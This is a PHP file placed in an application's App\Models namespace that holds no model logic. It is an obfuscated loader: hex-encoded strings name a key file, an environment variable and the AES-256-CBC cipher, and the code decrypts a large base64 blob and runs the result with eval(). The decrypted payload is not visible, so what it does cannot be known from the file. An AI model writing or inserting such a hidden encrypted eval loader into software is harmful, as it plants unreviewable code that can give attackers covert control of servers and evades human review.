<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('bbsyWcvkhQaSH29hgh8UoA==');

$c=base64_decode(

'eCf7pX0rHTuLavCuGgzWYRUi9FbKtpGWeVZRTw75j55v5g4lVhB8w97chpl0GLyE1hFWiGbN7/Og' .
'U7bfk45tPwmdFhIB4ryHzbgqEFoV+Y6DGS9i+7PmPoROzyfisiqpeZtoZrZg9hrxxMctg5+CkzOd' .
'nFJg81wwe4j7OIwa+zqeU4yaST+IDXga3SOiVwAOZ12AfYifRRFhL/e3YOdW2fh5il+JrfNwdXJ2' .
'qIe5VztNfovWCQnsocBcecnFu7oZwn8xExr8f2siz0qB27czGs26mSvgjimilBQeNwLk8p6T0fLR' .
'/tGdrKRWpi2cX+Tzz6H3RpcFV+rda+P4g0Yqew+sOebJXJIKaYouSrfB3NNuTjs1IrzjNsU5VGlv' .
'CzV7sGL6X8TuMupcOLhofyiyM3kx7nZjdZqeUuNP67GLTHAJgBpHNPRR5VgoBLjNeiWVlZbFMLIN' .
'hGjg0JG6sAGrLaUiJl5+ikw9mgcx/20wgoQIqEZnsjiBGxG169AN9oVgwKAyd/Rlb46kZaYLZsVm' .
'NPYt6rrkp/g15EuqOvvXfS1vMubbEek2vOLag52TaMBWrASE5uC282iva7WqYJAEQRKm46C9uimF' .
'RMTjUr3uprWl2tMAcr6afPKPWJrX57Mi7B4dLs1mQWJJL65g/2HWvPOZJfPTLzivyscEr4e8eQbV' .
'dSfo3JTXzkMOuCJ/iYZa4uAsSTF66gHyPOsUWII5GFu5kaBJcoOWvNw+hchSSNpolRNmu4Ov7ff7' .
'ybrqIGWm/1zrxTwPTE4vqQcOtUPmfrWTKkNziMoqSqk+x8TZx0xSbSqp/Y8Zn+ubU9ZMc5zZ5GDq' .
'FMcZ40+X5bu/krTlGzmNwR4nq+xJLg2r/OGzYSxcDt9QQuyOC60x6m4qYSyTi5yrC0icap1uailt' .
'/16hE1C9HstL5ifYavaoTEutwebo0fho2sRtHLghsGlYmDywuX56K8Jh/vk7N3CFi1nuedu6QzEG' .
'Nbc1ZGl0+x0ErV+nufl20GecS90NrIHONn7GLevmqI4l3QvcNQPrzuf+ZDJSH8ZVcC6FW9uyDceS' .
'RPHia8MrzfR5O3ULrER2do5Yu7AvHN6EorhkCMNMLekc22hzTqzoJTY/MOCrxL06kO2/sabUWf85' .
'cPKQZJj09mSwNUpXPrrn0jI1nZE0XSmUw393kvXk1kZ1JjQfAqVjwe3735iqHwJTXAherzE5xCim'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

